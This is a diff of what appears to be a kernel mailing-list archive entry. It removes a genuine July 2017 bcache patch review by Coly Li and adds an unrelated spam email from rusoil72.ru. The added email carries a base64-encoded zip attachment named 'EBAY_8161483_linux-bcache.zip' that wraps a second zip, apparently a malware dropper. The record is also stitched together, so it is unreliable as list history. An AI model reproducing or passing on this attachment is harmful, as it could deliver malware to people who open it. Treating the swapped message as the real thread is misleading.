@@ -1,74 +1,60 @@
-From: Coly Li <i@coly.li>
-Subject: Re: [PATCH 09/19 v2] bcache: update bio->bi_opf bypass/writeback REQ_
- flag hints
-Date: Tue, 4 Jul 2017 12:08:13 +0800
-Message-ID: <322b43aa-a312-6f74-da5f-f23f52c364b2@coly.li>
-References: <a4f5a7e5-97aa-4245-5f96-2df2045fb2a4@coly.li>
- <1499122284-11016-1-git-send-email-bcache@lists.ewheeler.net>
+From: <michele@milburnbrowning.com>
+Subject: (unknown)
+Date: Wed, 05 Jul 2017 00:06:39 -0000
+Message-ID: <149921319916.29695.16632659461627019946@rusoil72.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: 8bit
-Return-path: <linux-block-owner@vger.kernel.org>
-In-Reply-To: <1499122284-11016-1-git-send-email-bcache@lists.ewheeler.net>
-Content-Language: en-US
-Sender: linux-block-owner@vger.kernel.org
-To: bcache@lists.ewheeler.net, linux-block@vger.kernel.org
-Cc: linux-bcache@vger.kernel.org, hch@infradead.org, axboe@kernel.dk, Eric Wheeler <git@linux.ewheeler.net>, Eric Wheeler <bcache@linux.ewheeler.net>
+Content-Type: application/zip; name="EBAY_8161483_linux-bcache.zip"
+Content-Transfer-Encoding: base64
+Return-path: <linux-bcache-owner@vger.kernel.org>
+Received: from rusoil72.ru ([80.71.211.202]:58835 "HELO rusoil72.ru"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1752229AbdGEAGp (ORCPT <rfc822;linux-bcache@vger.kernel.org>);
+        Tue, 4 Jul 2017 20:06:45 -0400
+Subject: 
+Content-Disposition: attachment
+Sender: linux-bcache-owner@vger.kernel.org
 List-Id: linux-bcache@vger.kernel.org
+To: linux-bcache@vger.kernel.org
 
-On 2017/7/4 上午6:51, bcache@lists.ewheeler.net wrote:
-> From: Eric Wheeler <git@linux.ewheeler.net>
-> 
-> Flag for bypass if the IO is for read-ahead or background, unless the
-> read-ahead request is for metadata (eg, from gfs2).
-> 	Bypass if:
-> 		bio->bi_opf & (REQ_RAHEAD|REQ_BACKGROUND) && !(bio->bi_opf & REQ_META))
-> 
-> 	Writeback if:
-> 		op_is_sync(bio->bi_opf) || bio->bi_opf & (REQ_META|REQ_PRIO)
-> 
-> Signed-off-by: Eric Wheeler <bcache@linux.ewheeler.net>
-
-Reviewed-by: Coly Li <colyli@suse.de>
-
-I don't have any more suggestion, thanks.
-
-Coly
-
-> ---
->  drivers/md/bcache/request.c   | 7 +++++++
->  drivers/md/bcache/writeback.h | 3 ++-
->  2 files changed, 9 insertions(+), 1 deletion(-)
-> 
-> diff --git a/drivers/md/bcache/request.c b/drivers/md/bcache/request.c
-> index a95609f..859d08d 100644
-> --- a/drivers/md/bcache/request.c
-> +++ b/drivers/md/bcache/request.c
-> @@ -386,6 +386,13 @@ static bool check_should_bypass(struct cached_dev *dc, struct bio *bio)
->  	     op_is_write(bio_op(bio))))
->  		goto skip;
->  
-> +	/* Flag for bypass if the IO is for read-ahead or background,
-> +	 * unless the read-ahead request is for metadata (eg, for gfs2).
-> +	 */
-> +	if (bio->bi_opf & (REQ_RAHEAD|REQ_BACKGROUND) &&
-> +		!(bio->bi_opf & REQ_META))
-> +		goto skip;
-> +
->  	/* If the ioprio already exists on the bio, use that.  We assume that
->  	 * the upper layer properly assigned the calling process's ioprio to
->  	 * the bio being passed to bcache. Otherwise, use current's ioc. */
-> diff --git a/drivers/md/bcache/writeback.h b/drivers/md/bcache/writeback.h
-> index cd82fe8..ea2f92e 100644
-> --- a/drivers/md/bcache/writeback.h
-> +++ b/drivers/md/bcache/writeback.h
-> @@ -81,7 +81,8 @@ static inline bool should_writeback(struct cached_dev *dc, struct bio *bio,
->  		return true;
->  	}
->  
-> -	return op_is_sync(bio->bi_opf) || in_use <= CUTOFF_WRITEBACK;
-> +	return op_is_sync(bio->bi_opf) || bio->bi_opf & (REQ_META|REQ_PRIO)
-> +		|| in_use <= CUTOFF_WRITEBACK;
->  }
->  
->  static inline void bch_writeback_queue(struct cached_dev *dc)
+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
+AAAAAAEAAQBbAAAAwggAAAAA
